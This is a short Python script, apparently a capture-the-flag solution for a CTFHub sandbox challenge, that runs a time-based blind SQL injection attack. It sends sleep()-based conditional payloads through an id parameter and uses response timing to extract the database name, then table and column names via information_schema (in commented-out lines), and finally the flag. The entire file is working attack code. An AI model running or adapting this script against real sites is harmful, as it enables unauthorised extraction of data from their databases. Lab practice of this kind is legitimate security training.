#! /usr/bin/env python
# _*_  coding:utf-8 _*_
import requests
import sys
import time

session=requests.session()
url = "http://challenge-e53e5a329b0199fa.sandbox.ctfhub.com:10080/?id="
name = ""

for k in range(1,10):
	for i in range(1,10):
		print(i)
		for j in range(31,128):
			j = (128+31) -j
			str_ascii=chr(j)
			#数据库名
			payolad = "if(substr(database(),%s,1) = '%s',sleep(1),1)"%(str(i),str(str_ascii))
			#表名
			#payolad = "if(substr((select table_name from information_schema.tables where table_schema='sqli' limit %d,1),%d,1) = '%s',sleep(1),1)" %(k,i,str(str_ascii))
			#字段名
			#payolad = "if(substr((select column_name from information_schema.columns where table_name='flag' and table_schema='sqli'),%d,1) = '%s',sleep(1),1)" %(i,str(str_ascii))
			start_time=time.time()
			str_get = session.get(url=url + payolad)
			end_time = time.time()
			t = end_time - start_time
			if t > 1:
				if str_ascii == "+":
					sys.exit()
				else:
					name+=str_ascii
					break
		print(name)

#查询字段内容
for i in range(1,50):
	print(i)
	for j in range(31,128):
		j = (128+31) -j
		str_ascii=chr(j)
		payolad = "if(substr((select flag from sqli.flag),%d,1) = '%s',sleep(1),1)" %(i,str_ascii)
		start_time = time.time()
		str_get = session.get(url=url + payolad)
		end_time = time.time()
		t = end_time - start_time
		if t > 1:
			if str_ascii == "+":
				sys.exit()
			else:
				name += str_ascii
				break
	print(name)
